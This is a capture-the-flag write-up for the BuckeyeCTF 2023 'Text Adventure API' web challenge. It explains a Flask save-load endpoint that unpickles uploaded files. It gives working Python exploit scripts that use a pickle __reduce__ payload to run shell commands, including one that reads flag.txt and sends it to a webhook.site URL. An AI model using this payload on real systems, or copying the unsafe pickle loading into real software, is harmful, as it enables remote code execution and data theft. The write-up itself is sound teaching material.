# BuckeyeCTF 2023

## Text Adventure API

> Explore my kitchen!
>
>  Author: mbund
>
> [`export.zip`](export.zip)

Tags: _web_

## Solution
For this challenge we get the source code of a `api-service` that allows playing `text-adventure games` (kind of)... If we inspect the source we see a couple of routes.

```python
@app.route('/api/move', methods=['POST'])
def move():
    data = request.get_json()
    exit_choice = data.get("exit")
    current_location = get_current_location()
    if exit_choice in rooms[current_location]["exits"]:
        session['current_location'] = exit_choice
        return jsonify({"message": f"You move to the {exit_choice}. {rooms[exit_choice]['description']}"})
    else:
        return jsonify({"message": "You can't go that way."})

@app.route('/api/examine', methods=['GET'])
def examine():
    current_location = get_current_location()
    room_description = rooms[current_location]['description']
    exits = rooms[current_location]['exits']

    if "objects" in rooms[current_location]:
        objects = rooms[current_location]['objects']
        return jsonify({"current_location": current_location, "description": room_description, "objects": [obj for obj in objects], "exits": exits})
    else:
        return jsonify({"current_location": current_location, "description": room_description, "message": "There are no objects to examine here.", "exits": exits})

@app.route('/api/examine/<object_name>', methods=['GET'])
def examine_object(object_name):
    current_location = get_current_location()
    if "objects" in rooms[current_location] and object_name in rooms[current_location]['objects']:
        object_description = rooms[current_location]['objects'][object_name]
        return jsonify({"object": object_name, "description": object_description})
    else:
        return jsonify({"message": f"{object_name} not found or cannot be examined here."})
```

We can `move` from one room to another and `examine` items within the room we are currently in. Also we can get a full list of items and room exits when calling just `api/examine`. Then we have two more routes.

```python
@app.route('/api/save', methods=['GET'])
def save_session():
    session_data = {
        'current_location': get_current_location()
        # Add other session-related data as needed
    }

    memory_stream = io.BytesIO()
    pickle.dump(session_data, memory_stream)
    response = Response(memory_stream.getvalue(), content_type='application/octet-stream')
    response.headers['Content-Disposition'] = 'attachment; filename=data.pkl'

    return response

@app.route('/api/load', methods=['POST'])
def load_session():
    if 'file' not in request.files:
        return jsonify({"message": "No file part"})
    file = request.files['file']
    if file and file.filename.endswith('.pkl'):
        try:
            loaded_session = pickle.load(file)
            session.update(loaded_session)
        except:
            return jsonify({"message": "Failed to load save game session."})
        return jsonify({"message": "Game session loaded."})
    else:
        return jsonify({"message": "Invalid file format. Please upload a .pkl file."})
```

This looks interesting. We can provide a file that is loaded via `pickle.load`. This is meant to be used for loading a saved game session (or just teleporting to other rooms). But interestingly this uses [`pickle`](https://docs.python.org/3/library/pickle.html) which is vulnerable for [`rce`](https://davidhamann.de/2020/04/05/exploiting-python-pickle/).

We can just try this:

```python
import os
import pickle
import requests

class RCE:
    def __reduce__(self):
        cmd = "cat flag.txt"
        return os.system, (cmd,)

payload = {"file": ("foo.pkl", pickle.dumps(RCE()))}
response = requests.post("http://localhost:5000/api/load", files=payload)
print(response.text)
```

This script builds a payload that should allow executing `shell` commands when serialized by the server and uploads the payload via the `api/load` endpoint. When we run this script we get

```bash
$ python build.py
{"message":"Failed to load save game session."}
```

But most important in the container logs we find

```bash
foo-text-adventure-api-1  | bctf{fake_flag}
```

This worked, but we can't see the log with our client, so we have to think about how we can exfiltrate the information. Since the server has `python` installed, one way to do this is to run a python command from shell and send the result to our `webhook` site.

```python
import os
import pickle
import requests

class RCE:
    def __reduce__(self):
        cmd = 'python -c "import urllib.request;f=open(\'flag.txt\').read();urllib.request.urlopen(\'https://webhook.site/9def0198-db56-4b8d-bae4-f18ae1cacaf0?foo=\'+f)"'
        return os.system, (cmd,)

payload = {"file": ("foo.pkl", pickle.dumps(RCE()))}
response = requests.post("http://localhost:5000/api/load", files=payload)
print(response.text)
```

And after executing this the server gives us the flag.

```bash
https://webhook.site/9def0198-db56-4b8d-bae4-f18ae1cacaf0?foo=bctf{y0u_f0und_7h3_py7h0n_p1ckl3_1n_7h3_k17ch3n}
```

Flag `bctf{y0u_f0und_7h3_py7h0n_p1ckl3_1n_7h3_k17ch3n}`